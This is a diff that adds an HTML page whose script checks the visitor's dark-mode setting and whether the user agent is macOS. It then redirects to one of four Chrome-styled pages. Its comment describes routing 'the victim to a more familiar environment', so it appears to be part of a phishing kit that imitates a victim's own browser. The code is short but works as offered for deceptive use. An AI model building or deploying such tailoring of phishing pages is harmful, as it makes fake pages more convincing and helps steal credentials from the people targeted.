@@ -1,0 +1,31 @@
+<html>
+<head>
+
+</head>
+<body>
+	<script>
+		/* this is a router file to redirect the victim to a more familiar environment
+		for now, it only does basic OS and Theme detection*/
+
+		let mediaQueryObj = window.matchMedia('(prefers-color-scheme: dark)');
+		let usesdarkmode = mediaQueryObj.matches;
+		let usesMacOS = navigator.userAgent.search('Mac')!==-1;
+
+		let destination='';
+		if(usesdarkmode) {
+			if(usesMacOS) {
+				destination = "MacOS-Chrome-DarkMode/index.html";
+			} else {
+				destination = "Windows-Chrome-DarkMode/index.html";
+			}
+		} else {
+			if(usesMacOS) {
+				destination = "MacOS-Chrome-LightMode/index.html";
+			} else {
+				destination = "Windows-Chrome-LightMode/index.html";
+			}
+		}
+		window.location.replace(destination);
+	</script>
+</body>
+</html>
